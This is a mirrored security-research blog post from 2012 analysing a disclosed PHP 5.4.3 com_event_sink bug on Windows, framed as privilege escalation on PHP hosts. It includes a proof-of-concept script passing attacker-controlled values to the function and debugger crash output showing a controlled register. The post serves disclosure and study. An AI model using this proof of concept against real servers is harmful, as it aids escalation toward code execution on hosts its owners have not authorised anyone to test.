<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml" dir="ltr" lang="en">

<!-- Mirrored from garage4hackers.com/entry.php?b=394 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 13:34:23 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=ISO-8859-1" /><!-- /Added by HTTrack -->
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta id="e_vb_meta_bburl" name="vb_meta_bburl" content="index.html" />
<base  /><!--[if IE]></base><![endif]-->
<meta name="generator" content="vBulletin 4.2.1" />
<meta http-equiv="X-UA-Compatible" content="IE=9" />

	<link rel="Shortcut Icon" href="favicon.ico" type="image/x-icon" />


		<meta name="keywords" content="php 5.4.3 exploit, php exploit, Web-App Remote Code Execution Via Scripting Engines Part -1: Local Exploits PHP 0-day, ethical hacking,exploits,webapplication,penetration testing,wireless,information security,virus,exploit coding,vbulletin,forum,bbs,discussion,bulletin board,indian hackers" />
		<meta name="description" content="Web-App Remote Code Execution Via Scripting Engines Part -1: Local Exploits PHP 0-day Fb1h2s aka Rahul Sasi's Blog" />



	<meta property="fb:app_id" content="170793809601191" />
<meta property="og:site_name" content="Garage4hackers Forum" />
<meta property="og:description" content="Web-App Remote Code Execution Via Scripting Engines Part -1: Local Exploits PHP 0-day Fb1h2s aka Rahul Sasi's Blog" />
<meta property="og:url" content="entry133c.html?b=394" />
<meta property="og:type" content="article" />




	
		<script type="text/javascript" src="../yui.yahooapis.com/comboaa66?2.9.0/build/yuiloader-dom-event/yuiloader-dom-event.js&amp;2.9.0/build/connection/connection-min.js"></script>
	

<script type="text/javascript">
<!--
	if (typeof YAHOO === 'undefined') // Load ALL YUI Local
	{
		document.write('<script type="text/javascript" src="clientscript/yui/yuiloader-dom-event/yuiloader-dom-event6719.html?v=421"><\/script>');
		document.write('<script type="text/javascript" src="clientscript/yui/connection/connection-min6719.html?v=421"><\/script>');
		var yuipath = 'clientscript/yui';
		var yuicombopath = '';
		var remoteyui = false;
	}
	else	// Load Rest of YUI remotely (where possible)
	{
		var yuipath = '../external.html?link=http://yui.yahooapis.com/2.9.0/build';
		var yuicombopath = '../external.html?link=http://yui.yahooapis.com/combo';
		var remoteyui = true;
		if (!yuicombopath)
		{
			document.write('<script type="text/javascript" src="../yui.yahooapis.com/2.9.0/build/connection/connection-min6719.js?v=421"><\/script>');
		}
	}
	var SESSIONURL = "";
	var SECURITYTOKEN = "guest";
	var IMGDIR_MISC = "images/misc";
	var IMGDIR_BUTTON = "images/buttons";
	var vb_disable_ajax = parseInt("0", 10);
	var SIMPLEVERSION = "421";
	var BBURL = "index.html";
	var LOGGEDIN = 0 > 0 ? true : false;
	var THIS_SCRIPT = "entry";
	var RELPATH = "entry133c.html?b=394";
	var PATHS = {
		forum : "",
		cms   : "",
		blog  : ""
	};
	var AJAXBASEURL = "index.html";
// -->
</script>
<script type="text/javascript" src="clientscript/vbulletin-core6719.js?v=421"></script>



	<link rel="alternate" type="application/rss+xml" title="Garage4hackers Forum RSS Feed" href="external9476.php?type=RSS2" />
	



	<link rel="stylesheet" type="text/css" href="css30f2.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,editor.css,popupmenu.css,reset-fonts.css,vbulletin.css,vbulletin-chrome.css,vbulletin-formcontrols.css," />

	<!--[if lt IE 8]>
	<link rel="stylesheet" type="text/css" href="css.php?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=popupmenu-ie.css,vbulletin-ie.css,vbulletin-chrome-ie.css,vbulletin-formcontrols-ie.css,editor-ie.css" />
	<![endif]-->


	
		
			<link rel="alternate" type="application/rss+xml" title="Fb1h2s aka Rahul Sasi's Blog - Garage4hackers Forum Blog RSS Feed" href="blog_external9107.php?type=RSS2&amp;bloguserid=8" />
		
		<link rel="alternate" type="application/rss+xml" title="Garage4hackers Forum - Blog RSS Feed" href="blog_external9476.php?type=RSS2" />
	
	<link rel="pingback" href="forum.html" />
	
		<!--
			<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
				xmlns:dc="http://purl.org/dc/elements/1.1/"
				xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/">
			<rdf:Description
				rdf:about="http://garage4hackers.com/entry.php?b=394"
				dc:identifier="http://garage4hackers.com/entry.php?b=394"
				dc:title="Web-App Remote Code Execution Via Scripting Engines Part -1: Local Exploits PHP 0-day"
				trackback:ping="http://garage4hackers.com/blog_callback.php?b=394" />
			</rdf:RDF>
		-->
	
	
		<link rel="stylesheet" type="text/css" href="css68b4.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=postbit-lite.css,blog.css,lightbox.css,attachment.css" />
	
	<!--[if lt IE 8]>
	<script type="text/javascript" src="clientscript/vbulletin-threadlist-ie.js?v=421"></script>
	<link rel="stylesheet" type="text/css" href="css.php?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=postbit-lite-ie.css,blog-ie.css" />
	<![endif]-->
	
	
	
	
		<script type="text/javascript">
		<!--
			vBulletin.register_control("vB_Blog_Userid", "8");
		//-->
		</script>
	
<script type="text/javascript" src="clientscript/vbulletin_ajax_suggest6719.js?v=421"></script>
	
		<title>Web-App Remote Code Execution Via Scripting Engines Part -1: Local Exploits PHP 0-day - Blogs - Garage4hackers Forum</title>
	
	<link rel="stylesheet" type="text/css" href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" />

</head>
<body >
<div class="above_body"> <!-- closing tag is in template navbar -->
<div id="header" class="floatcontainer doc_header">
	<div><a name="top" href="forum.html" class="logo-image"><img src="images/misc/vbulletin4_logo.html" alt="Garage4hackers Forum" /></a></div>
	<div id="toplinks" class="toplinks">
		
			<ul class="nouser">
			
				<li><a href="register.html" rel="nofollow">Register</a></li>
			
				<li><a rel="help" href="faq.html">Help</a></li>
				<li>
			<script type="text/javascript" src="clientscript/vbulletin_md56719.html?v=421"></script>
			<form id="navbar_loginform" action="../external.html?link=http://garage4hackers.com/login.php?do=login" method="post" onsubmit="md5hash(vb_login_password, vb_login_md5password, vb_login_md5password_utf, 0)">
				<fieldset id="logindetails" class="logindetails">
					<div>
						<div>
					<input type="text" class="textbox default-value" name="vb_login_username" id="navbar_username" size="10" accesskey="u" tabindex="101" value="User Name" />
					<input type="password" class="textbox" tabindex="102" name="vb_login_password" id="navbar_password" size="10" />
					<input type="text" class="textbox default-value" tabindex="102" name="vb_login_password_hint" id="navbar_password_hint" size="10" value="Password" style="display:none;" />
					<input type="submit" class="loginbutton" tabindex="104" value="Log in" title="Enter your username and password in the boxes provided to login, or click the 'register' button to create a profile for yourself." accesskey="s" />
						</div>
					</div>
				</fieldset>
				<div id="remember" class="remember">
					<label for="cb_cookieuser_navbar"><input type="checkbox" name="cookieuser" value="1" id="cb_cookieuser_navbar" class="cb_cookieuser_navbar" accesskey="c" tabindex="103" /> Remember Me?</label>
				</div>

				<input type="hidden" name="s" value="" />
				<input type="hidden" name="securitytoken" value="guest" />
				<input type="hidden" name="do" value="login" />
				<input type="hidden" name="vb_login_md5password" />
				<input type="hidden" name="vb_login_md5password_utf" />
			</form>
			<script type="text/javascript">
			YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "inline");
			YAHOO.util.Dom.setStyle('navbar_password', "display", "none");
			vB_XHTML_Ready.subscribe(function()
			{
			//
				YAHOO.util.Event.on('navbar_username', "focus", navbar_username_focus);
				YAHOO.util.Event.on('navbar_username', "blur", navbar_username_blur);
				YAHOO.util.Event.on('navbar_password_hint', "focus", navbar_password_hint);
				YAHOO.util.Event.on('navbar_password', "blur", navbar_password);
			});
			
			function navbar_username_focus(e)
			{
			//
				var textbox = YAHOO.util.Event.getTarget(e);
				if (textbox.value == 'User Name')
				{
				//
					textbox.value='';
					textbox.style.color='#000000';
				}
			}

			function navbar_username_blur(e)
			{
			//
				var textbox = YAHOO.util.Event.getTarget(e);
				if (textbox.value == '')
				{
				//
					textbox.value='User Name';
					textbox.style.color='#777777';
				}
			}
			
			function navbar_password_hint(e)
			{
			//
				var textbox = YAHOO.util.Event.getTarget(e);
				
				YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "none");
				YAHOO.util.Dom.setStyle('navbar_password', "display", "inline");
				YAHOO.util.Dom.get('navbar_password').focus();
			}

			function navbar_password(e)
			{
			//
				var textbox = YAHOO.util.Event.getTarget(e);
				
				if (textbox.value == '')
				{
					YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "inline");
					YAHOO.util.Dom.setStyle('navbar_password', "display", "none");
				}
			}
			</script>
				</li>
				
					<li id="fb_headerbox" class="hidden">

	<a id="fb_loginbtn" href="#"><img src="images/misc/facebook_login.html" alt="The Facebook Platform" /></a>

</li>

				
			</ul>
		
	</div>
	<div class="ad_global_header">
		 
		 
	</div>
	<hr />
</div>
<div id="navbar" class="navbar">
	<ul id="navtabs" class="navtabs floatcontainer">
		
		
	
		<li  id="vbtab_whatsnew">
			<a class="navtab" href="activity.html">What's New?</a>
		</li>
		
		

	
		<li  id="vbtab_cms">
			<a class="navtab" href="content.html">Articles</a>
		</li>
		
		

	
		<li  id="vbtab_forum">
			<a class="navtab" href="forum.html">Forum</a>
		</li>
		
		

	
		<li class="selected" id="vbtab_blog">
			<a class="navtab" href="blog.html">Blogs</a>
		</li>
		
		
			<ul class="floatcontainer">
				
					
						
							<li id="vbblog_recent"><a href="blog2d60.html?do=list">Recent Entries</a></li>
						
					
				
					
						
							<li id="vbblog_popular"><a href="blog7e3c.html?do=list&amp;blogtype=best">Most Popular</a></li>
						
					
				
					
						
							<li id="vbblog_member"><a href="blogd08d.html?do=bloglist">Member Blogs</a></li>
						
					
				
			</ul>
		

	
		<li  id="tab_nja4_357">
			<a class="navtab" href="pages7b82.html?pageid=2">G4H Team</a>
		</li>
		
		

	
		<li  id="tab_nta0_579">
			<a class="navtab" href="pages8782.html?pageid=3">IRC</a>
		</li>
		
		

	
		<li  id="tab_nta0_442">
			<a class="navtab" href="pagesdbe0.html?pageid=4">Ranchoddas</a>
		</li>
		
		

		<li>
            <a class="navtab" href="pages.html">Events and Conferences</a></li>
	</ul>
	
		<div id="globalsearch" class="globalsearch">
			<form action="../external.html?link=http://garage4hackers.com/search.php?do=process" method="post" id="navbar_search" class="navbar_search">
				
				<input type="hidden" name="securitytoken" value="guest" />
				<input type="hidden" name="do" value="process" />
				<span class="textboxcontainer"><span><input type="text" value="" name="query" class="textbox" tabindex="99"/></span></span>
				<span class="buttoncontainer"><span><input type="image" class="searchbutton" src="images/buttons/search.html" name="submit" onclick="document.getElementById('navbar_search').submit;" tabindex="100"/></span></span>
			</form>
			<ul class="navbar_advanced_search">
				<li><a href="search.html" accesskey="4">Advanced Search</a></li>
				
			</ul>
		</div>
	
</div>
</div><!-- closing div for above_body -->

<div class="body_wrapper">
<div id="breadcrumb" class="breadcrumb">
	<ul class="floatcontainer">
		<li class="navbithome"><a href="content.html" accesskey="1"><img src="images/misc/navbit-home.html" alt="Home" /></a></li>
		
	<li class="navbit"><a href="blog.html">Blogs</a></li>

	<li class="navbit"><a href="bloge81f.html?u=8">Fb1h2s aka Rahul Sasi's Blog</a></li>

		
	<li class="navbit lastnavbit"><span>Web-App Remote Code Execution Via Scripting Engines Part -1: Local Exploits PHP 0-day</span></li>

	</ul>
	<hr />
</div>


<div style="width:728px; margin:0 auto; padding-bottom:1em">
<script type="text/javascript"><!--
google_ad_client = "ca-pub-6847984837250662";
google_ad_host = "ca-host-pub-2606800903002383";
google_ad_width = 728;
google_ad_height = 15;
google_ad_format = "728x15_0ads_al_s";
google_ad_channel = "";
google_color_border = "";
google_color_bg = "";
google_color_link = "";
google_color_text = "";
google_color_url = "";
google_ui_features = "rc:6";
//-->
</script>
<script type="text/javascript"
  src="../pagead2.googlesyndication.com/pagead/show_ads.js">
</script>
</div>

<div id="ad_global_below_navbar"><script async src="../pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- garage1 -->
<ins class="adsbygoogle"
     style="display:inline-block;width:728px;height:90px"
     data-ad-client="ca-pub-6847984837250662"
     data-ad-slot="4036513682"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script></div>


	<form action="../external.html?link=http://garage4hackers.com/profile.php?do=dismissnotice" method="post" id="notices" class="notices">
		<input type="hidden" name="do" value="dismissnotice" />
		<input type="hidden" name="s" value="" />
		<input type="hidden" name="securitytoken" value="guest" />
		<input type="hidden" id="dismiss_notice_hidden" name="dismiss_noticeid" value="" />
		<input type="hidden" name="url" value="" />
		<ol>
			<li class="restore" id="navbar_notice_2">
	
	<html>
<h2>
The forum is <a href="showthread1180.html?t=7049&amp;p=14985#post14985">frozen forever</a> - but it won't die; it'll stay for long in search engine results and we hope it would keep helping newbies in some way or other - cheers! 


</h2>

<!-- Mirrored from garage4hackers.com/entry.php?b=394 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 13:34:23 GMT -->
</html>
</li>
		</ol>
	</form>



<div id="usercss" class="blog">
	<div class="cleardiv"></div>

	
	
	<div id="content_container">
		<div id="content">
			<div id="content_inner" class="blockrow restrain_container">
			<!-- main content -->
			<div id="pagetitle">
	
	<a id="rssicon" href="blog_external9107.php?type=RSS2&amp;bloguserid=8" rel="nofollow"><img src="images/misc/rss_40b.html" border="0" class="inlineimg" alt="View RSS Feed" /></a>
	
	<h1>Fb1h2s aka Rahul Sasi's Blog</h1>
</div>




<div id="ad_blogshowentry_before"><script type="text/javascript"><!--
google_ad_client = "pub-6847984837250662";
/* 728x90, created 7/11/10 blog entry */
google_ad_slot = "0606213533";
google_ad_width = 728;
google_ad_height = 90;
//-->
</script>
<script type="text/javascript"
src="../pagead2.googlesyndication.com/pagead/show_ads.js">
</script></div>
<div id="above_blogentry">
	
</div>
<div class="block blogentrybit" id="entry394">
	<h4 id="blog_title" class="blog_header">
		Web-App Remote Code Execution Via Scripting Engines Part -1: Local Exploits PHP 0-day
		
		
	</h4>
	<div class="fly">
		
			<div class="popupmenu" id="blograting">
				<h6><a class="popupctrl" href="javascript://" id="blograting_current"><img class="inlineimg" src="images/rating/rating-15_5.html" alt="Rating: 50 votes, 4.80 average." /></a></h6>
				<form action="../external.html?link=http://garage4hackers.com/blog.php" method="post" id="blog_blograte_form">
					<div class="popupbody popuphover">
						<ul>
							
								<li><label for="r5"><span class="rating r5">
									<input type="radio" name="vote" value="5" id="r5"  /> Excellent
								</span></label></li>
								<li><label for="r4"><span class="rating r4_right">
									<input type="radio" name="vote" value="4" id="r4"  /> Good
								</span></label></li>
								<li><label for="r3"><span class="rating r3_right">
									<input type="radio" name="vote" value="3" id="r3"  /> Average
								</span></label></li>
								<li><label for="r2"><span class="rating r2_right">
									<input type="radio" name="vote" value="2" id="r2"  /> Bad
								</span></label></li>
								<li><label for="r1"><span class="rating r1_right">
									<input type="radio" name="vote" value="1" id="r1"  /> Terrible
								</span></label></li>
								<li class="formsubmit"><input type="submit" class="button" value="Vote Now" /></li>
							
						</ul>
						<input type="hidden" name="s" value="" />
						<input type="hidden" name="securitytoken" value="guest" />
						<input type="hidden" name="do" value="rate" />
						<input type="hidden" name="b" value="394" />
					</div>
				</form>
				<script type="text/javascript" src="clientscript/blog_ajax_rate6719.html?v=421"></script>
				<script type="text/javascript">
				<!--
					var blogid = 394;
					vB_AJAX_BlogRate_Init('blog_blograte_form');
				//-->
				</script>
			</div>
		
	</div>
	<div class="block blogbit">
		<div class="bloghead">
			<div class="fly">
				
<a href="entry133c.html?b=394#comments" class="comments">14 Comments</a>
				
				
			</div>
			<div class="blog_date">
				by <div class="popupmenu memberaction">
	<a class="username offline popupctrl" href="membere81f.html?u=8" title="fb1h2s is offline"><strong>fb1h2s</strong></a>
	<ul class="popupbody popuphover memberaction_body">
		<li class="left">
			<a href="membere81f.html?u=8" class="siteicon_profile">
				View Profile
			</a>
		</li>
		
		<li class="right">
			<a href="search9898.html?do=finduser&amp;userid=8&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">
				View Forum Posts
			</a>
		</li>
		
		
		<li class="left">
			<a href="privatedce0.html?do=newpm&amp;u=8" class="siteicon_message" rel="nofollow">
				Private Message
			</a>
		</li>
		
		
		
		<li class="right">
			<a href="bloge81f.html?u=8" class="siteicon_blog" rel="nofollow">
				View Blog Entries
			</a>
		</li>
		
		
		
		<li class="left">
			<a href="index.html" class="siteicon_homepage">
				Visit Homepage
			</a>
		</li>
		
		
		
		<li class="right">
			<a href="list2c25.html?r=author/8-fb1h2s" class="siteicon_article" rel="nofollow">
				View Articles
			</a>
		</li>
		

		

		
		
	</ul>
</div>, 08-20-2012 at 07:07 PM  (24051 Views)
			</div>
		</div>
		
			
<fb:like href="entry133c.html?b=394" font="tahoma" layout="standard" show_faces="false" width="260" action="../external.html?link=http://garage4hackers.com/like" colorscheme="light"></fb:like>
		
		<div class="blogbody postcontainer">
			<div id="entry_text_394">
				<blockquote class="blogcontent restore floatcontainer">
					<img src="../external.html?link=http://www.is-ra.org/c0c0n/404" border="0" alt="" /><br />
This would be part-1 one of my <a href="../external.html?link=http://is-ra.org/c0c0n/speakers.html" target="_blank">C0C0n</a> talk , where I demonstrated few PHP 0-days, Local and Remote . The entire concept of the talk was demonstrating attacks on WebApplications via scripting engines.<br />
<br />
In a common Webapp test we manipulates Input , that a common end user controls and check for responses from the app. But since these data passed are processed by the PHP,ASP engines that are used to build these apps. We were fuzzing and trying to figure out issues in these engines that could be attacked by common user. My talk had two parts Local Attacks and Remote Attacks. Local attacks I demonstrated ways to do privilege escalation exploiting PHP and in Remote Attacks we mapped PHP functions that took arguments from remote users like File processing and Image Processing functions and demonstrated ways to exploit them.The entire presentation concentrated on PHP core Bugs.  <br />
<br />
 <br />
Current  post would be on PHP local attacks only [The first part of the Talk]  , since once of these issue is already out, it's time to blog. <br />
<br />
I would put down some intro on PHP architecture, the history of PHP local attacks and exploits that were commonly used in the wild for privilege escalation followed by my our own 0-days [The way how I delivered my Talk]. <br />
<br />
<br />
<br />
<i><u>Note: The images put up here are not created by me, at the time of making PPTs I downloaded them via google images, and now I have no clue whom to give credit. <br />
</u></i><br />
<br />
Web Application How Stuffs Work. <br />
<br />
1) User[browser] Send Inputs to Webapp -<br />
2) Http Server catches and<br />
3) Passes it to Web App --&gt;<br />
4) WebApp send it to Scripting engine to process it.<br />
<br />
<br />
<img src="attachment9697.jpg?attachmentid=477&amp;d=1345375194" border="0" alt="Name:  WebbAppArticeture.jpg
Views: 4890
Size:  19.8 KB"  style="float: CONFIG" /><br />
<br />
<u>PHP Architecture  : <br />
</u><br />
These digrams are good enough to explain php Architecture in Detail, instead of me writing about them in detail. <br />
<br />
1) <br />
<img src="attachmenta11a.jpg?attachmentid=478&amp;d=1345401723" border="0" alt="Name:  phpartic.jpg
Views: 4767
Size:  24.3 KB"  style="float: CONFIG" /><br />
<b><u><br />
PHP + Apache Security Architecture :</u></b><br />
<br />
1) So if we could execute code in context of PHP , you would be able to break out many restrictions. <br />
2) Should be able to get shell access to hardned PHP Hosts.<br />
3) Shared hosting Windows servers are affected the most.<br />
4) These sort of bugs are rated 10/10 in a CVE score by PHP.   <br />
<br />
<img src="attachment91f6.jpg?attachmentid=479&amp;d=1345404982" border="0" alt="Name:  phppace.jpg
Views: 4026
Size:  22.8 KB"  style="float: CONFIG" /><br />
<br />
<u><b>Why PHP Local Exploits.<br />
</b></u><br />
1) For Privilege Escalation <br />
2) Code Execution in Protected Environments <br />
3) Bypassing Security Restrictions <br />
<br />
<b><u>History of PHP Local Exploits for Bug Hunters:<br />
</u></b><br />
1) <a href="../external.html?link=http://www.garage4hackers.com/f37/private-symlink-php-exploit-tutorial-silic0n-509.html" target="_blank">PHP Symlink Exploit	</a><br />
2) PHP Nginx Exploit<br />
3)  _php_stream_scandir<br />
4)CVE-2011-3268 [crypt function]<br />
5) PHP XSLT Injection <br />
<a href="../external.html?link=http://xhe.myxwiki.org/xwiki/bin/view/XSLT/Application_PHP5" target="_blank">http://xhe.myxwiki.org/xwiki/bin/vie...plication_PHP5</a><br />
<br />
The best of PHP bug hunts were done by <a href="../external.html?link=http://developers.slashdot.org/story/10/06/04/1540241/month-of-php-security-finds-60-bugs" target="_blank">i0nic and team </a> for there &quot;Month of PHP Security&quot; in <a href="../external.html?link=http://php-security.org/MOPB/index.html" target="_blank">2007</a> and <a href="../external.html?link=http://www.php-security.org/" target="_blank">2010  </a>. About 60 security issues were identified and few POCs were released. <br />
<br />
Or you coud Browse this well organized archive . <a href="../external.html?link=http://www.cvedetails.com/vendor/74/PHP.html" target="_blank">PHP : Products and vulnerabilities</a><br />
<br />
In April 2012 I found few local security issues , that were added to CoCon CFP , which later was identified by <a href="../external.html?link=http://cond.psychodela.pl/" target="_blank">condis</a> <a href="../external.html?link=http://cxsecurity.com/issue/WLB-2012050163" target="_blank">PHP &lt;= 5.4.3 (com_event_sink) Code Execution Proof of Concept - CXSecurity WLB</a> independently . Now that this issue is <a href="../external.html?link=https://bugs.php.net/bug.php?id=62474" target="_blank">Public</a> , I will put down my analysis notes on getting code execution on this bug. Current bug only affect PHP Windows. <br />
<br />
<u><b>PHP 5.4.3 Com_event_sink 0-day:<br />
</b></u><br />
<br />
<b>The Vulnerable Function:<br />
</b><br />
PHP Provides a module to interact with COM and .Net (Windows). In that com_event_sink is used the following way.<br />
<br />
It allows users to call a COM instance , in current case [IE] and interact with it. <br />
Note: This feature is handy if the server you have access has disallowed other mechanism to download files to it like .<br />
<br />
The following code will open an IE instance and download the webpage <a href="../external.html?link=http://www.google.com/" target="_blank">Google</a>. The function com_event_sink takes three arguments.<br />
<br />
1)  --&gt; $ie = new COM(&quot;InternetExplorer.Application&quot;);<br />
<br />
     Address of the Com object to be interacted <br />
<br />
2) --&gt; Sink Object<br />
<br />
3) -- &gt; Sink Interface<br />
<br />
 com_event_sink($ie, $sink, &quot;DWebBrowserEvents2&quot;);<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:360px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">&lt;?php<br /></span><span style="color: #007700">class&nbsp;</span><span style="color: #0000BB">IEEventSinker&nbsp;</span><span style="color: #007700">{<br />&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;</span><span style="color: #0000BB">$terminated&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">false</span><span style="color: #007700">;<br /><br />&nbsp;&nbsp;&nbsp;function&nbsp;</span><span style="color: #0000BB">ProgressChange</span><span style="color: #007700">(</span><span style="color: #0000BB">$progress</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">$progressmax</span><span style="color: #007700">)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;</span><span style="color: #DD0000">"Download&nbsp;progress:&nbsp;</span><span style="color: #0000BB">$progress</span><span style="color: #DD0000">&nbsp;/&nbsp;</span><span style="color: #0000BB">$progressmax</span><span style="color: #DD0000">\n"</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;</span><span style="color: #0000BB">DocumentComplete</span><span style="color: #007700">(&amp;</span><span style="color: #0000BB">$dom</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">$url</span><span style="color: #007700">)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;</span><span style="color: #DD0000">"Document&nbsp;</span><span style="color: #0000BB">$url</span><span style="color: #DD0000">&nbsp;complete\n"</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;</span><span style="color: #0000BB">OnQuit</span><span style="color: #007700">()&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;</span><span style="color: #DD0000">"Quit!\n"</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$this</span><span style="color: #007700">-&gt;</span><span style="color: #0000BB">terminated&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">true</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />}<br /></span><span style="color: #0000BB">$ie&nbsp;</span><span style="color: #007700">=&nbsp;new&nbsp;</span><span style="color: #0000BB">COM</span><span style="color: #007700">(</span><span style="color: #DD0000">"InternetExplorer.Application"</span><span style="color: #007700">);<br /></span><span style="color: #FF8000">//&nbsp;note&nbsp;that&nbsp;you&nbsp;don't&nbsp;need&nbsp;the&nbsp;&amp;&nbsp;for&nbsp;PHP&nbsp;5!<br /></span><span style="color: #0000BB">$sink&nbsp;</span><span style="color: #007700">=&nbsp;new&nbsp;</span><span style="color: #0000BB">IEEventSinker</span><span style="color: #007700">();<br /></span><span style="color: #0000BB">com_event_sink</span><span style="color: #007700">(</span><span style="color: #0000BB">$ie</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">$sink</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">"DWebBrowserEvents2"</span><span style="color: #007700">);<br /></span><span style="color: #0000BB">$ie</span><span style="color: #007700">-&gt;</span><span style="color: #0000BB">Visible&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">true</span><span style="color: #007700">;<br /></span><span style="color: #0000BB">$ie</span><span style="color: #007700">-&gt;</span><span style="color: #0000BB">Navigate</span><span style="color: #007700">(</span><span style="color: #DD0000">"http://www.google.com"</span><span style="color: #007700">);<br />while(!</span><span style="color: #0000BB">$sink</span><span style="color: #007700">-&gt;</span><span style="color: #0000BB">terminated</span><span style="color: #007700">)&nbsp;{<br />&nbsp;&nbsp;</span><span style="color: #0000BB">com_message_pump</span><span style="color: #007700">(</span><span style="color: #0000BB">4000</span><span style="color: #007700">);<br />}<br /></span><span style="color: #0000BB">$ie&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">null</span><span style="color: #007700">;<br /></span><span style="color: #0000BB">?&gt;</span>
</span>
</code></code></div>
</div><b>The Bug: <br />
</b><br />
<br />
The first argument is the adress of the COM object to load and it's controlled by the user. And no validation is done on the address, and this is address is directly used. [Very Bad logic]<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:84px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">$ie&nbsp;</span><span style="color: #007700">=&nbsp;new&nbsp;</span><span style="color: #0000BB">COM</span><span style="color: #007700">(</span><span style="color: #DD0000">"InternetExplorer.Application"</span><span style="color: #007700">);<br /></span><span style="color: #FF8000">//&nbsp;note&nbsp;that&nbsp;you&nbsp;don't&nbsp;need&nbsp;the&nbsp;&amp;&nbsp;for&nbsp;PHP&nbsp;5!<br /></span><span style="color: #0000BB">$sink&nbsp;</span><span style="color: #007700">=&nbsp;new&nbsp;</span><span style="color: #0000BB">IEEventSinker</span><span style="color: #007700">();<br /><br /></span><span style="color: #0000BB">com_event_sink</span><span style="color: #007700">(</span><span style="color: #0000BB">$ie</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">$sink</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">"DWebBrowserEvents2"</span><span style="color: #007700">);&nbsp;<br /></span><span style="color: #0000BB"></span>
</span>
</code></code></div>
</div><br />
<u>POC<br />
</u><br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:180px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">&lt;?php<br /><br /><br />$buffer&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">str_repeat</span><span style="color: #007700">(</span><span style="color: #DD0000">"B"</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">1000</span><span style="color: #007700">);<br /><br /><br /></span><span style="color: #0000BB">$vVar&nbsp;</span><span style="color: #007700">=&nbsp;new&nbsp;</span><span style="color: #0000BB">VARIANT</span><span style="color: #007700">(</span><span style="color: #0000BB">0x43434343</span><span style="color: #007700">);&nbsp;</span><span style="color: #FF8000">//&nbsp;We&nbsp;controll&nbsp;this<br /></span><span style="color: #0000BB">$vVar2&nbsp;</span><span style="color: #007700">=&nbsp;new&nbsp;</span><span style="color: #0000BB">VARIANT</span><span style="color: #007700">(</span><span style="color: #0000BB">0x41414141</span><span style="color: #007700">);&nbsp;</span><span style="color: #FF8000">//&nbsp;<br /><br /><br /></span><span style="color: #0000BB">com_event_sink</span><span style="color: #007700">(</span><span style="color: #0000BB">$vVar</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">$vVar2&nbsp;</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">$buffer&nbsp;</span><span style="color: #007700">);<br /><br /></span><span style="color: #0000BB">?&gt;</span>
</span>
</code></code></div>
</div><div class="bbcode_container">
	<div class="bbcode_description">Code:</div>
	<pre class="bbcode_code"style="height:216px;">(310.1fc): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=00000000 ecx=00372ad0 edx=0114dd88 esi=43434343 edi=0114d9b8
eip=102f59bd esp=00c1f988 ebp=00c1f9dc iopl=0         nv up ei pl zr na pe nc
